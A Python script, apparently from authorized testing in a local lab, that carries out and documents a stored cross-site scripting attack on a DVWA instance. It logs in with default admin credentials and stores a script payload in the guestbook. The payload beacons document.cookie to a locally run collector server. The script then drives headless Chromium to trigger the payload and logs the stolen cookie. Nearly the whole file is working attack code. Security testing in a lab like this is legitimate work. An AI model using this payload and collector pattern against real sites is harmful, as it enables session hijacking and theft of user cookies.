#!/usr/bin/env python3
# loop3 t4 probe6: B5 存储型 XSS 完整危害证明
#  1) 在 Kali 内 127.0.0.1:8099 起一个"接收端"，记录完整原始请求（含 Cookie 头）
#  2) DVWA low 级别下把 <script> 存入 guestbook（写端点，标注副作用）
#  3) 用真实 Chromium(selenium) 以 admin 身份打开该页面 → 载荷执行 → Cookie 打到接收端
#  4) 直查数据库取存储原文 + 记录渲染 HTML 片段
import json, time, datetime, threading, subprocess, re, os
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

BASE = "http://127.0.0.1"
GAP = 1.2
UA = "loop3-t4/1.0 (authorized local lab)"
SINK_PORT = 8099
SINK_LOG = "/tmp/loop3-t4-b5-sink.jsonl"
CANARY = "loop3t4canary778899"
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": []}


def rec(name, **kw):
    OUT["steps"].append({"step": name, **kw})
    print(f"--- {name}: " + json.dumps(kw, ensure_ascii=False)[:1000], flush=True)
    return kw


def db(sql):
    r = subprocess.run(["sudo", "-n", "mariadb", "-N", "-e", sql], capture_output=True, text=True)
    return r.stdout.strip()


# ---------------- 1) 接收端（仅 127.0.0.1） ----------------
class Sink(BaseHTTPRequestHandler):
    def _log(self, method):
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length).decode("utf-8", "replace") if length else ""
        entry = {
            "at": datetime.datetime.now().isoformat(),
            "method": method,
            "path": self.path,
            "client": self.client_address[0],
            "headers": {k: v for k, v in self.headers.items()},
            "body": body[:2000],
        }
        with open(SINK_LOG, "a") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
        print("SINK_HIT " + json.dumps(entry, ensure_ascii=False)[:600], flush=True)

    def do_GET(self):
        self._log("GET")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"loop3-sink-ok")

    def do_POST(self):
        self._log("POST")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *a):
        pass


srv = HTTPServer(("127.0.0.1", SINK_PORT), Sink)
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.5)
probe = requests.get(f"http://127.0.0.1:{SINK_PORT}/selftest", timeout=5)
rec("sink_started", port=SINK_PORT, self_test_status=probe.status_code,
    listen="127.0.0.1 only", logfile=SINK_LOG)

# ---------------- 2) 存储型 XSS 注入（写端点） ----------------
S = requests.Session()
S.headers["User-Agent"] = UA
S.cookies.set("security", "low", domain="127.0.0.1", path="/")
r = S.get(BASE + "/dvwa/login.php", timeout=20)
m = re.search(r"name='user_token' value='([^']+)'", r.text)
time.sleep(GAP)
S.post(BASE + "/dvwa/login.php",
       data={"username": "admin", "password": "password", "Login": "Login", "user_token": m.group(1)},
       allow_redirects=False, timeout=20)
rec("dvwa_login", phpsessid=S.cookies.get("PHPSESSID"), security=S.cookies.get("security"))

before = db("SELECT COUNT(*) FROM dvwa.guestbook;")
rec("guestbook_rows_before", count=before)

payload = ('<script>new Image().src="http://127.0.0.1:%d/beacon?t=%s&c="'
           '+encodeURIComponent(document.cookie)</script>') % (SINK_PORT, CANARY)
time.sleep(GAP)
r = S.post(BASE + "/dvwa/vulnerabilities/xss_s/",
           data={"txtName": "loop3t4", "mtxMessage": payload, "btnSign": "Sign Guestbook"},
           timeout=20)
rec("stored_xss_post", status=r.status_code, payload=payload,
    reflected_unescaped=(payload in r.text))

time.sleep(GAP)
stored = db("SELECT id, comment FROM dvwa.guestbook WHERE name='loop3t4' ORDER BY id DESC LIMIT 1;")
after = db("SELECT COUNT(*) FROM dvwa.guestbook;")
row_id = stored.split("\t")[0] if stored else ""
rec("guestbook_row_after", count=after, last_row=stored[:400], row_id=row_id)
rec("stored_unescaped_in_page", payload_in_page=(payload in r.text))
rec("db_stored_plaintext", note="comparing stored value with payload",
    identical=(payload in stored))

# ---------------- 3) 真实浏览器触发 ----------------
driver_info = {"ok": False}
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.common.by import By

    opts = Options()
    opts.binary_location = "/usr/bin/chromium"
    for a in ("--headless=new", "--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
              "--window-size=1280,900"):
        opts.add_argument(a)
    d = webdriver.Chrome(service=ChromeService(executable_path="/usr/bin/chromedriver"), options=opts)
    driver_info["ok"] = True
    driver_info["version"] = getattr(d, "capabilities", {}).get("browserVersion")

    d.get(BASE + "/dvwa/login.php")
    d.add_cookie({"name": "security", "value": "low", "domain": "127.0.0.1", "path": "/"})
    d.get(BASE + "/dvwa/login.php")
    d.find_element(By.NAME, "username").send_keys("admin")
    d.find_element(By.NAME, "password").send_keys("password")
    d.find_element(By.NAME, "Login").click()
    time.sleep(GAP)
    rec("browser_login", url=d.current_url, title=d.title,
        document_cookie=d.execute_script("return document.cookie"))

    n_before = sum(1 for _ in open(SINK_LOG)) if os.path.exists(SINK_LOG) else 0
    d.get(BASE + "/dvwa/vulnerabilities/xss_s/")
    time.sleep(3.0)
    n_after = sum(1 for _ in open(SINK_LOG)) if os.path.exists(SINK_LOG) else 0
    src = d.page_source
    rec("browser_rendered_xss_s", url=d.current_url, title=d.title,
        raw_script_tag_in_dom=(payload in src),
        escape_check=("&lt;script&gt;" in src),
        sink_hits_added=n_after - n_before)
    d.save_screenshot("/tmp/loop3-t4-b5-xss.png")
    rec("browser_screenshot", path="/tmp/loop3-t4-b5-xss.png",
        bytes=(os.path.getsize("/tmp/loop3-t4-b5-xss.png") if os.path.exists("/tmp/loop3-t4-b5-xss.png") else 0))
    d.quit()
except Exception as e:
    driver_info["error"] = repr(e)[:600]
    rec("browser_error", error=repr(e)[:600])
rec("driver_info", **driver_info)

# ---------------- 4) 接收端证据 ----------------
hits = []
if os.path.exists(SINK_LOG):
    for line in open(SINK_LOG):
        line = line.strip()
        if not line:
            continue
        e = json.loads(line)
        hits.append({"method": e["method"], "path": e["path"][:300],
                     "client": e["client"], "Cookie": e["headers"].get("Cookie"),
                     "User-Agent": e["headers"].get("User-Agent"),
                     "Referer": e["headers"].get("Referer")})
rec("sink_hits", count=len(hits), hits=hits)
beacon = [h for h in hits if CANARY in (h["path"] or "")]
rec("beacon_received", count=len(beacon), cookie_leaked=(beacon[0]["Cookie"] if beacon else None),
    path=(beacon[0]["path"] if beacon else None))

with open("/tmp/loop3-t4-probe6.json", "w") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
srv.shutdown()
print(json.dumps({"rc": "ok", "steps": len(OUT["steps"]), "row_id": row_id, "beacon": len(beacon)}))
